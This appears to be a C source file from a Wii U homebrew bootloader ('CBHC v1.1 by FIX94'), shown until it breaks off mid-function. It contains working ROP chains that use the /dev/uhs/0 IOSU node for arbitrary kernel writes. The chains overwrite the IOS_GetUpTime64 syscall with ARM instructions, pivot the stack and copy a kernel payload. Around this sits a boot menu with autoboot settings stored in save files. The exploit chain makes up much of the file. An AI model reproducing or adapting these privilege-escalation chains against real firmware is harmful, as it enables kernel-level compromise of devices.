/*
 * Copyright (C) 2016 FIX94
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */
#include <string.h>
#include "types.h"
#include "coreinit.h"
#include "pad.h"

#define CHAIN_START         0x1016AD40
#define SHUTDOWN            0x1012EE4C
#define SIMPLE_RETURN       0x101014E4
#define SOURCE              0x01E20000
#define IOS_CREATETHREAD    0x1012EABC
#define ARM_CODE_BASE       0x08134100
#define REPLACE_SYSCALL     0x081298BC

/* YOUR ARM CODE HERE (starts at ARM_CODE_BASE) */
#include "payload/arm_kernel_bin.h"
#include "payload/arm_user_bin.h"

/* ROP CHAIN STARTS HERE (0x1015BD78) */
static const int final_chain[] = {
   0x101236f3,        // 0x00      POP {R1-R7,PC}
   0x0,               // 0x04      arg
   0x0812974C,        // 0x08      stackptr     CMP R3, #1; STREQ R1, [R12]; BX LR
   0x68,              // 0x0C      stacksize
   0x10101638,        // 0x10
   0x0,               // 0x14
   0x0,               // 0x18
   0x0,               // 0x1C
   0x1010388C,        // 0x20      CMP R3, #0; MOV R0, R4; LDMNEFD SP!, {R4,R5,PC}
   0x0,               // 0x24
   0x0,               // 0x28
   0x1012CFEC,        // 0x2C      MOV LR, R0; MOV R0, LR; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x30
   0x0,               // 0x34
   IOS_CREATETHREAD,  // 0x38
   0x1,               // 0x3C
   0x2,               // 0x40
   0x10123a9f,        // 0x44      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x00, // 0x48      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE92D4010,        // 0x4C      value: PUSH {R4,LR}
   0x0,               // 0x50
   0x10123a8b,        // 0x54      POP {R3,R4,PC}
   0x1,               // 0x58      R3 must be 1 for the arbitrary write
   0x0,               // 0x5C
   0x1010CD18,        // 0x60      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x64
   0x0,               // 0x68
   0x1012EE64,        // 0x6C      set_panic_behavior (arbitrary write)
   0x0,               // 0x70
   0x0,               // 0x74
   0x10123a9f,        // 0x78      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x04, // 0x7C      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A04000,        // 0x80      value: MOV R4, R0
   0x0,               // 0x84
   0x10123a8b,        // 0x88      POP {R3,R4,PC}
   0x1,               // 0x8C      R3 must be 1 for the arbitrary write
   0x0,               // 0x90
   0x1010CD18,        // 0x94      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x98
   0x0,               // 0x9C
   0x1012EE64,        // 0xA0      set_panic_behavior (arbitrary write)
   0x0,               // 0xA4
   0x0,               // 0xA8
   0x10123a9f,        // 0xAC      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x08, // 0xB0      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE3E00000,        // 0xB4      value: MOV R0, #0xFFFFFFFF
   0x0,               // 0xB8
   0x10123a8b,        // 0xBC      POP {R3,R4,PC}
   0x1,               // 0xC0      R3 must be 1 for the arbitrary write
   0x0,               // 0xC4
   0x1010CD18,        // 0xC8      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0xCC
   0x0,               // 0xD0
   0x1012EE64,        // 0xD4      set_panic_behavior (arbitrary write)
   0x0,               // 0xD8
   0x0,               // 0xDC
   0x10123a9f,        // 0xE0      POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x0C, // 0xE4      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE030F10,        // 0xE8      value: MCR   P15, #0, R0, C3, C0, #0 (set dacr to R0)
   0x0,               // 0xEC
   0x10123a8b,        // 0xF0      POP {R3,R4,PC}
   0x1,               // 0xF4      R3 must be 1 for the arbitrary write
   0x0,               // 0xF8
   0x1010CD18,        // 0xFC      MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x100
   0x0,               // 0x104
   0x1012EE64,        // 0x108     set_panic_behavior (arbitrary write)
   0x0,               // 0x10C
   0x0,               // 0x110
   0x10123a9f,        // 0x114     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x10, // 0x118     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A00004,        // 0x11C     value: MOV R0, R4
   0x0,               // 0x120
   0x10123a8b,        // 0x124     POP {R3,R4,PC}
   0x1,               // 0x128     R3 must be 1 for the arbitrary write
   0x0,               // 0x12C
   0x1010CD18,        // 0x130     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x134
   0x0,               // 0x138
   0x1012EE64,        // 0x13C     set_panic_behavior (arbitrary write)
   0x0,               // 0x140
   0x0,               // 0x144
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x14, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE12FFF33,        // 0x150     value: BLX R3 KERNEL_MEMCPY
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x18, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0x00000000,        // 0x150     value: NOP
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x1C, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE17FF7A,        // 0x150     value: clean_loop: MRC p15, 0, r15, c7, c10, 3
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x20, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0x1AFFFFFD,        // 0x150     value: BNE clean_loop
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x24, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xEE070F9A,        // 0x150     value: MCR p15, 0, R0, c7, c10, 4
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   0x1010CD18,        // 0x164     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x168
   0x0,               // 0x16C
   0x1012EE64,        // 0x170     set_panic_behavior (arbitrary write)
   0x0,               // 0x174
   0x0,               // 0x178
   0x10123a9f,        // 0x17C     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x28, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A03004,        // 0x184     value: MOV R3, R4
   0x0,               // 0x188
   0x10123a8b,        // 0x18C     POP {R3,R4,PC}
   0x1,               // 0x190     R3 must be 1 for the arbitrary write
   0x0,               // 0x194
   0x1010CD18,        // 0x198     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x19C
   0x0,               // 0x1A0
   0x1012EE64,        // 0x1A4     set_panic_behavior (arbitrary write)
   0x0,               // 0x1A8
   0x0,               // 0x1AC
   0x10123a9f,        // 0x17C     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x2C, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE8BD4010,        // 0x184     value: POP {R4,LR}
   0x0,               // 0x188
   0x10123a8b,        // 0x18C     POP {R3,R4,PC}
   0x1,               // 0x190     R3 must be 1 for the arbitrary write
   0x0,               // 0x194
   0x1010CD18,        // 0x198     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x19C
   0x0,               // 0x1A0
   0x1012EE64,        // 0x1A4     set_panic_behavior (arbitrary write)
   0x0,               // 0x1A8
   0x0,               // 0x1AC
   0x10123a9f,        // 0x1B0     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL + 0x30, // 0x1B4     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE12FFF13,        // 0x1B8     value: BX R3 our code :-)
   0x0,               // 0x1BC
   0x10123a8b,        // 0x1C0     POP {R3,R4,PC}
   0x1,               // 0x1C4     R3 must be 1 for the arbitrary write
   0x0,               // 0x1C8
   0x1010CD18,        // 0x1CC     MOV R12, R0; MOV R0, R12; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,               // 0x1D0
   0x0,               // 0x1D4
   0x1012EE64,        // 0x1D8     set_panic_behavior (arbitrary write)
   0x0,               // 0x1DC
   0x0,               // 0x1E0
   0x10123a9f,        // 0x1E4     POP {R0,R1,R4,PC}
   REPLACE_SYSCALL,        // 0x1DC     start of syscall IOS_GetUpTime64
   0x4001,            // 0x1E0     on > 0x4000 it flushes all data caches
   0x0,               // 0x1E0
   0x1012ED4C,        // 0x1E4     IOS_FlushDCache(void *ptr, unsigned int len)
   0x0,               // 0x1DC
   0x0,               // 0x1E0
   0x10123a9f,        // 0x1E4     POP {R0,R1,R4,PC}
   ARM_CODE_BASE,     // 0x1E8     our code destination address
   0x0,               // 0x1EC
   0x0,               // 0x1F0
   0x101063db,        // 0x1F4     POP {R1,R2,R5,PC}
   0x0,               // 0x1F8
   sizeof(arm_kernel_bin),   // 0x1FC     our code size
   0x0,               // 0x200
   0x10123983,        // 0x204     POP {R1,R3,R4,R6,PC}
   0x01E40000,        // 0x208     our code source location
   0x08131D04,        // 0x20C     KERNEL_MEMCPY address
   0x0,               // 0x210
   0x0,               // 0x214
   0x1012EBB4,        // 0x218     IOS_GetUpTime64 (privileged stack pivot)
   0x0,
   0x0,
   0x101312D0,
};

static const int second_chain[] = {
   0x10123a9f, // 0x00         POP {R0,R1,R4,PC}
   CHAIN_START + 0x14 + 0x4 + 0x20 - 0xF000,     // 0x04         destination
   0x0,        // 0x08
   0x0,        // 0x0C
   0x101063db, // 0x10         POP {R1,R2,R5,PC}
   0x01E30000, // 0x14         source
   sizeof(final_chain),          // 0x18         length
   0x0,        // 0x1C
   0x10106D4C, // 0x20         BL MEMCPY; MOV R0, #0; LDMFD SP!, {R4,R5,PC}
   0x0,        // 0x24
   0x0,        // 0x28
   0x101236f3, // 0x2C         POP {R1-R7,PC}
   0x0,        // 0x30         arg
   0x101001DC, // 0x34         stackptr
   0x68,       // 0x38         stacksize
   0x10101634, // 0x3C         proc: ADD SP, SP, #8; LDMFD SP!, {R4,R5,PC}
   0x0,        // 0x40
   0x0,        // 0x44
   0x0,        // 0x48
   0x1010388C, // 0x4C         CMP R3, #0; MOV R0, R4; LDMNEFD SP!, {R4,R5,PC}
   0x0,        // 0x50
   0x0,        // 0x54
   0x1012CFEC, // 0x58         MOV LR, R0; MOV R0, LR; ADD SP, SP, #8; LDMFD SP!, {PC}
   0x0,        // 0x5C
   0x0,        // 0x60
   IOS_CREATETHREAD, // 0x64
   0x1,        // 0x68         priority
   0x2,        // 0x6C         flags
   0x0,        // 0x70
   0x0,        // 0x74
   0x101063db, // 0x78         POP {R1,R2,R5,PC}
   0x0,        // 0x7C
   -(0x240 + 0x18 + 0xF000), // 0x80  stack offset
   0x0,        // 0x84
   0x101141C0, // 0x88         MOV R0, R9; ADD SP, SP, #0xC; LDMFD SP!, {R4-R11,PC}
   0x0,
   0x0,
   0x0,
   0x00110000 - 0x44, // 0x8C
   0x00110010,        // 0x90
   0x0,        // 0x94
   0x0,        // 0x98
   0x0,        // 0x9C
   0x0,        // 0xA0
   0x0,        // 0xA4
   0x4,        // 0xA8         R11 must equal 4 in order to pivot the stack
   0x101088F4, //              STR R0, [R4,#0x44]; MOVEQ R0, R5; STRNE R3, [R5]; LDMFD SP!, {R4,R5,PC}
   0x0,
   0x0,
   0x1012EA68, // 0xAC         stack pivot
};

static void uhs_exploit_init(unsigned int coreinit_handle);
static int uhs_write32(unsigned int coreinit_handle, int dev_uhs_0_handle, int arm_addr, int val);
static unsigned int getButtonsDown(unsigned int padscore_handle, unsigned int vpad_handle);

#define BUS_SPEED                       248625000
#define SECS_TO_TICKS(sec)              (((unsigned long long)(sec)) * (BUS_SPEED/4))
#define MILLISECS_TO_TICKS(msec)        (SECS_TO_TICKS(msec) / 1000)
#define MICROSECS_TO_TICKS(usec)        (SECS_TO_TICKS(usec) / 1000000)

#define usleep(usecs)                   OSSleepTicks(MICROSECS_TO_TICKS(usecs))
#define sleep(secs)                     OSSleepTicks(SECS_TO_TICKS(secs))

#define FORCE_SYSMENU (VPAD_BUTTON_ZL | VPAD_BUTTON_ZR | VPAD_BUTTON_L | VPAD_BUTTON_R)
#define FORCE_HBL (VPAD_BUTTON_A | VPAD_BUTTON_B | VPAD_BUTTON_X | VPAD_BUTTON_Y)
#define SD_HBL_PATH "/vol/external01/wiiu/apps/homebrew_launcher/homebrew_launcher.elf"

static const char *verChar = "CBHC v1.1 by FIX94";

#define DEFAULT_DISABLED 0
#define DEFAULT_SYSMENU 1
#define DEFAULT_HBL 2
#define DEFAULT_CFW_IMG 3
#define DEFAULT_MAX 4

static const char *defOpts[DEFAULT_MAX] = {
	"DEFAULT_DISABLED",
	"DEFAULT_SYSMENU",
	"DEFAULT_HBL",
	"DEFAULT_CFW_IMG",
};

static const char *bootOpts[DEFAULT_MAX] = {
	"Disabled",
	"System Menu",
	"Homebrew Launcher",
	"fw.img on SD Card",
};

#define LAUNCH_SYSMENU 0
#define LAUNCH_HBL 1
#define LAUNCH_CFW_IMG 2

#define OSScreenClearBuffer(tmp) OSScreenClearBufferEx(0, tmp); OSScreenClearBufferEx(1, tmp);
#define OSScreenPutFont(x, y, buf) OSScreenPutFontEx(0, x, y, buf); OSScreenPutFontEx(1, x, y, buf);
#define OSScreenFlipBuffers() OSScreenFlipBuffersEx(0); OSScreenFlipBuffersEx(1);

uint32_t __main(void)
{
	unsigned int coreinit_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);

	void (*DCStoreRange)(const void *addr, uint32_t length);
	OSDynLoad_FindExport(coreinit_handle, 0, "DCStoreRange", &DCStoreRange);

	void (*OSExitThread)(int);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSExitThread", &OSExitThread);

	unsigned int sysapp_handle;
	OSDynLoad_Acquire("sysapp.rpl", &sysapp_handle);

	unsigned long long(*_SYSGetSystemApplicationTitleId)(int sysApp);
	OSDynLoad_FindExport(sysapp_handle,0,"_SYSGetSystemApplicationTitleId",&_SYSGetSystemApplicationTitleId);
	unsigned long long sysmenu = _SYSGetSystemApplicationTitleId(0);

	//set up default hbl path
	strcpy((void*)0xF5E70000,SD_HBL_PATH);

	unsigned int vpad_handle;
	OSDynLoad_Acquire("vpad.rpl", &vpad_handle);

	int(*VPADRead)(int controller, VPADData *buffer, unsigned int num, int *error);
	OSDynLoad_FindExport(vpad_handle, 0, "VPADRead", &VPADRead);

    int vpadError = -1;
    VPADData vpad;
	VPADRead(0, &vpad, 1, &vpadError);
	if(vpadError == 0)
	{
		if(((vpad.btns_d|vpad.btns_h) & FORCE_SYSMENU) == FORCE_SYSMENU)
		{
			// iosuhax-less menu launch backup code
			int(*_SYSLaunchTitleWithStdArgsInNoSplash)(unsigned long long tid, void *ptr);
			OSDynLoad_FindExport(sysapp_handle,0,"_SYSLaunchTitleWithStdArgsInNoSplash",&_SYSLaunchTitleWithStdArgsInNoSplash);
			_SYSLaunchTitleWithStdArgsInNoSplash(sysmenu, 0);
			OSExitThread(0);
			return 0;
		}
		else if(((vpad.btns_d|vpad.btns_h) & FORCE_HBL) == FORCE_HBL)
		{
			// original hbl loader payload
			return 0x01800000;
		}
	}

	unsigned int *pMEMAllocFromDefaultHeapEx;
	unsigned int *pMEMFreeToDefaultHeap;
	OSDynLoad_FindExport(coreinit_handle, 1, "MEMAllocFromDefaultHeapEx", &pMEMAllocFromDefaultHeapEx);
	OSDynLoad_FindExport(coreinit_handle, 1, "MEMFreeToDefaultHeap", &pMEMFreeToDefaultHeap);
	void*(*MEMAllocFromDefaultHeapEx)(int size, int align) = (void*)(*pMEMAllocFromDefaultHeapEx);
	void(*MEMFreeToDefaultHeap)(void *ptr) = (void*)(*pMEMFreeToDefaultHeap);

	void *pClient = MEMAllocFromDefaultHeapEx(0x1700,4);
	void *pCmd = MEMAllocFromDefaultHeapEx(0xA80,4);

	int(*FSInit)(void);
	void(*FSShutdown)(void);
	int(*FSAddClient)(void *pClient, int errHandling);
	int(*FSDelClient)(void *pClient);
	void(*FSInitCmdBlock)(void *pCmd);
	
	int(*FSWriteFile)(void *pClient, void *pCmd, const void *buffer, int size, int count, int fd, int flag, int errHandling);
	int(*FSCloseFile)(void *pClient, void *pCmd, int fd, int errHandling);

	OSDynLoad_FindExport(coreinit_handle, 0, "FSInit", &FSInit);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSShutdown", &FSShutdown);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSInitCmdBlock", &FSInitCmdBlock);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSAddClient", &FSAddClient);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSDelClient", &FSDelClient);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSWriteFile", &FSWriteFile);
	OSDynLoad_FindExport(coreinit_handle, 0, "FSCloseFile", &FSCloseFile);

	unsigned int act_handle;
	OSDynLoad_Acquire("nn_act.rpl", &act_handle);

	unsigned int save_handle;
	OSDynLoad_Acquire("nn_save.rpl", &save_handle);
	void(*SAVEInit)(void);
	void(*SAVEShutdown)(void);
	void(*SAVEInitSaveDir)(unsigned char user);
	int(*SAVEOpenFile)(void *pClient, void *pCmd, unsigned char user, const char *path, const char *mode, int *fd, int errHandling);
	int(*SAVEFlushQuota)(void *pClient, void *pCmd, unsigned char user, int errHandling);
	void(*SAVERename)(void *pClient, void *pCmd, unsigned char user, const char *oldpath, const char *newpath, int errHandling);
	OSDynLoad_FindExport(save_handle, 0, "SAVEInit",&SAVEInit);
	OSDynLoad_FindExport(save_handle, 0, "SAVEShutdown",&SAVEShutdown);
	OSDynLoad_FindExport(save_handle, 0, "SAVEInitSaveDir",&SAVEInitSaveDir);
	OSDynLoad_FindExport(save_handle, 0, "SAVEOpenFile", &SAVEOpenFile);
	OSDynLoad_FindExport(save_handle, 0, "SAVEFlushQuota", &SAVEFlushQuota);
	OSDynLoad_FindExport(save_handle, 0, "SAVERename", &SAVERename);

	void(*nn_act_initialize)(void);
	unsigned char(*nn_act_getslotno)(void);
	void(*nn_act_finalize)(void);
	OSDynLoad_FindExport(act_handle, 0, "Initialize__Q2_2nn3actFv", &nn_act_initialize);
	OSDynLoad_FindExport(act_handle, 0, "GetSlotNo__Q2_2nn3actFv", &nn_act_getslotno);
	OSDynLoad_FindExport(act_handle, 0, "Finalize__Q2_2nn3actFv", &nn_act_finalize);

	FSInit();
	nn_act_initialize();
	unsigned char slot = nn_act_getslotno();
	SAVEInit();
	SAVEInitSaveDir(slot);
	FSAddClient(pClient, -1);
	FSInitCmdBlock(pCmd);

	int autoboot = -1;
	int iFd = -1;
	int i;
	for(i = 0; i < DEFAULT_MAX; i++)
	{
		SAVEOpenFile(pClient, pCmd, slot, defOpts[i], "r", &iFd, -1);
		if (iFd >= 0)
		{
			autoboot = i;
			FSCloseFile(pClient, pCmd, iFd, -1);
			break;
		}
	}
	if(autoboot < 0)
	{
		autoboot = DEFAULT_DISABLED;
		SAVEOpenFile(pClient, pCmd, slot, defOpts[DEFAULT_DISABLED], "w", &iFd, -1);
		if (iFd >= 0)
			FSCloseFile(pClient, pCmd, iFd, -1);
	}
	int launchmode = (autoboot > 0) ? (autoboot - 1) : LAUNCH_SYSMENU;
	int cur_autoboot = autoboot;

    void(*OSScreenInit)();
	void(*OSScreenEnableEx)(int,int);
    unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
    unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);

    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenEnableEx", &OSScreenEnableEx);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);

    unsigned int(*OSScreenClearBufferEx)(unsigned int bufferNum, unsigned int temp);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenClearBufferEx", &OSScreenClearBufferEx);

    unsigned int(*OSScreenPutFontEx)(unsigned int bufferNum, unsigned int posX, unsigned int posY, const char * buffer);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenPutFontEx", &OSScreenPutFontEx);

    unsigned int(*OSScreenFlipBuffersEx)(unsigned int bufferNum);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenFlipBuffersEx", &OSScreenFlipBuffersEx);

    OSScreenInit();
    int screen_buf0_size = OSScreenGetBufferSizeEx(0);
    OSScreenSetBufferEx(0, (void *)0xF4000000);
    OSScreenSetBufferEx(1, (void *)0xF4000000 + screen_buf0_size);
	OSScreenEnableEx(1, 0);
	OSScreenEnableEx(1, 1);

    unsigned int padscore_handle;
    OSDynLoad_Acquire("padscore.rpl", &padscore_handle);

	void(*OSSleepTicks)(unsigned long long ticks);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks",&OSSleepTicks);

	void(*WPADEnableURCC)(int enable);
	void(*KPADSetConnectCallback)(int chan, void *ptr);
	void*(*WPADSetSyncDeviceCallback)(void *ptr);
	void(*KPADShutdown)(void);
	OSDynLoad_FindExport(padscore_handle, 0, "WPADEnableURCC", &WPADEnableURCC);
	OSDynLoad_FindExport(padscore_handle, 0, "KPADSetConnectCallback", &KPADSetConnectCallback);
	OSDynLoad_FindExport(padscore_handle, 0, "WPADSetSyncDeviceCallback", &WPADSetSyncDeviceCallback);
	OSDynLoad_FindExport(padscore_handle, 0, "KPADShutdown",&KPADShutdown);
	//easly allows us callback without execute permission on other cores
	char(*WPADGetSpeakerVolume)(void);
	void(*WPADSetSpeakerVolume)(char);
	OSDynLoad_FindExport(padscore_handle, 0, "WPADGetSpeakerVolume", &WPADGetSpeakerVolume);
	OSDynLoad_FindExport(padscore_handle, 0, "WPADSetSpeakerVolume", &WPADSetSpeakerVolume);
	//enable wiiu pro controller connection
    WPADEnableURCC(1);
	//hachihachi instantly disconnects wiimotes normally
	KPADSetConnectCallback(0,NULL);
	KPADSetConnectCallback(1,NULL);
	KPADSetConnectCallback(2,NULL);
	KPADSetConnectCallback(3,NULL);
	char oriVol = WPADGetSpeakerVolume();
	//WPAD_SYNC_EVT=0 is button pressed
	WPADSetSpeakerVolume(1);
	WPADSetSyncDeviceCallback(WPADSetSpeakerVolume);

	if(autoboot == DEFAULT_DISABLED)
		goto cbhc_menu;

	OSScreenClearBuffer(0);
	OSScreenPutFont(0, 0, verChar);
	OSScreenPutFont(0, 1, "Autobooting...");
	OSScreenFlipBuffers();

	//garbage read
	getButtonsDown(padscore_handle, vpad_handle);
	//see if menu is requested
	int loadMenu = 0;
	int waitCnt = 40;
	while(waitCnt--)
	{
		unsigned int btnDown = getButtonsDown(padscore_handle, vpad_handle);

        if((btnDown & VPAD_BUTTON_HOME) || WPADGetSpeakerVolume() == 0)
		{
			WPADSetSpeakerVolume(1);
			loadMenu = 1;
            break;
		}
		usleep(50000);
	}

	if(loadMenu == 0)
		goto doIOSUexploit;

	OSScreenClearBuffer(0);
	OSScreenPutFont(0, 0, verChar);
	OSScreenPutFont(0, 1, "Entering Menu...");
	OSScreenFlipBuffers();
	waitCnt = 30;
	while(waitCnt--)
	{
		getButtonsDown(padscore_handle, vpad_handle);
		usleep(50000);
	}

cbhc_menu:	;
	int redraw = 1;
	int PosX = 0;
	int ListMax = 4;
	int clickT = 0;
	while(1)
	{
		unsigned int btnDown = getButtonsDown(padscore_handle, vpad_handle);

		if(WPADGetSpeakerVolume() == 0)
		{
			if(clickT == 0)
				clickT = 8;
			else
			{
				btnDown |= VPAD_BUTTON_A;
				clickT = 0;
			}
			WPADSetSpeakerVolume(1);
		}
		else if(clickT)
		{
			clickT--;
			if(clickT == 0)
				btnDown |= VPAD_BUTTON_DOWN;
		}

		if( btnDown & VPAD_BUTTON_DOWN )
		{
			if(PosX+1 == ListMax)
				PosX = 0;
			else
				PosX++;
			redraw = 1;
		}

		if( btnDown & VPAD_BUTTON_UP )
		{
			if( PosX <= 0 )
				PosX = (ListMax-1);
			else
				PosX--;
			redraw = 1;
		}

		if( btnDown & VPAD_BUTTON_A )
		{
			if(PosX == 3)
			{
				cur_autoboot++;
				if(cur_autoboot == DEFAULT_MAX)
					cur_autoboot = DEFAULT_DISABLED;
				redraw = 1;
			}
			else
			{
				launchmode = PosX;
				break;
			}
		}

		if(redraw)
		{
			OSScreenClearBuffer(0);
			OSScreenPutFont(0, 0, verChar);

			char printStr[64];
			__os_snprintf(printStr,64,"%c Boot System Menu", 0 == PosX ? '>' : ' ');
			OSScreenPutFont(0, 1, printStr);
			__os_snprintf(printStr,64,"%c Boot Homebrew Launcher", 1 == PosX ? '>' : ' ');
			OSScreenPutFont(0, 2, printStr);
			__os_snprintf(printStr,64,"%c Boot fw.img on SD Card", 2 == PosX ? '>' : ' ');
			OSScreenPutFont(0, 3, printStr);
			__os_snprintf(printStr,64,"%c Autoboot: %s", 3 == PosX ? '>' : ' ', bootOpts[cur_autoboot]);
			OSScreenPutFont(0, 4, printStr);

			OSScreenFlipBuffers();
			redraw = 0;
		}
		usleep(50000);
	}
	OSScreenClearBuffer(0);
	OSScreenFlipBuffers();
	usleep(50000);

doIOSUexploit:
	WPADSetSpeakerVolume(oriVol);
	KPADShutdown();

	if(cur_autoboot != autoboot)
		SAVERename(pClient, pCmd, slot, defOpts[autoboot], defOpts[cur_autoboot], -1);

	SAVEFlushQuota(pClient, pCmd, slot, -1);
	FSDelClient(pClient);
    SAVEShutdown();
	nn_act_finalize();
    FSShutdown();

	MEMFreeToDefaultHeap(pClient);
	MEMFreeToDefaultHeap(pCmd);

	OSScreenClearBuffer(0);
	OSScreenFlipBuffers();

	memcpy((void*)0xF5E70100, &sysmenu, 8);
	*(volatile unsigned int*)0xF5E70120 = (launchmode == LAUNCH_CFW_IMG);
	DCStoreRange((void*)0xF5E70100, 0x40);

	int (*OSForceFullRelaunch)(void);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSForceFullRelaunch", &OSForceFullRelaunch);

	//for patched menu launch
    void (*SYSLaunchMenu)(void);
    OSDynLoad_FindExport(sysapp_handle, 0,"SYSLaunchMenu", &SYSLaunchMenu);

	int (*IOS_Open)(char *path, unsigned int mode);
	int (*IOS_Close)(int fd);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Open", &IOS_Open);
	OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Close", &IOS_Close);

    int dev_uhs_0_handle = IOS_Open("/dev/uhs/0", 0); //! Open /dev/uhs/0 IOS node
    uhs_exploit_init(coreinit_handle);            //! Init variables for the exploit

                                               //!------ROP CHAIN-------

    uhs_write32(coreinit_handle, dev_uhs_0_handle, CHAIN_START + 0x14, CHAIN_START + 0x14 + 0x4 + 0x20);
    uhs_write32(coreinit_handle, dev_uhs_0_handle, CHAIN_START + 0x10, 0x1011814C);
    uhs_write32(coreinit_handle, dev_uhs_0_handle, CHAIN_START + 0xC, SOURCE);

    uhs_write32(coreinit_handle, dev_uhs_0_handle, CHAIN_START, 0x1012392b); // pop {R4-R6,PC}

    IOS_Close(dev_uhs_0_handle);

	if(launchmode == LAUNCH_HBL)
		return 0x01800000;
	//sysmenu or cfw
	if(launchmode == LAUNCH_CFW_IMG)
		OSForceFullRelaunch();
	SYSLaunchMenu();
	OSExitThread(0);
	return 0;
}

static unsigned int wpadToVpad(unsigned int buttons)
{
	unsigned int conv_buttons = 0;

